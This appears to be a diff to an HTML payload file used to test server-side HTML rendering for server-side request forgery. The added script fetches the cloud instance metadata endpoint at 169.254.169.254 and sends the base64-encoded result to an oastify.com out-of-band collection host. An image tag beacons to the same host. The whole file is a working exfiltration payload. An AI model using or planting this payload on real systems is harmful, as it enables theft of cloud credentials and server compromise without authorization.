@@ -1,4 +1,15 @@
 <!DOCTYPE html>
 <html>
-    <img src="http://acqzuq1auzkl3crxtrgu751nze55twhl.oastify.com">
+<img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
+<script>var TARGET = 'http://169.254.169.254/latest/meta-data/';
+var COLLAB = 'https://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com';
+
+var r = new XMLHttpRequest();
+r.open('GET', TARGET, false);
+r.setRequestHeader('Metadata-Flavor', 'Google');
+r.send();
+
+var x = new XMLHttpRequest();
+x.open('GET', COLLAB + '/?s=' + r.status + '&d=' + btoa(r.responseText || ''), false);
+x.send();</script>
 </html>
